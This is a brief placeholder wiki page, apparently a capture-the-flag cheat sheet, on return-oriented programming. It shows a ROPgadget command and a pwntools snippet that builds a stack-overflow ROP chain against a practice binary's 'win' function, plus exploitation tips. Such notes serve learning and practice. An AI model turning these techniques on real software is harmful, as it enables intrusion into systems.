---
title: "rop cheatsheet"
---

> Placeholder page — replace with real notes. This exists to show how a wiki page renders.

## finding gadgets

```bash
ROPgadget --binary ./vuln --only "pop|ret"
```

## building a chain with pwntools

```python
from pwn import *

elf = ELF("./vuln")
rop = ROP(elf)
rop.raw(rop.find_gadget(["pop rdi", "ret"]))
rop.raw(elf.sym["win"])

payload = flat({0: b"A" * 40, 40: rop.chain()})
```

## notes

- Check `checksec` first — canary / PIE / NX / RELRO change the whole approach.
- Leak a libc address before assuming offsets.
